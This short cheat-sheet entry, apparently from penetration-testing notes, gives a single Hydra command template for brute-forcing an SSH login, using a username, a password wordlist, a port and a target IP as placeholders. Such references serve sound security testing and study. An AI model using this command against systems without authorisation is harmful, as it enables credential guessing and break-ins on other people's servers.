# SSH

Using Hydra to bruteforce an ssh Login:

```
hydra -l <username> -P <wordlist> -s <port> ssh://<ip>
```
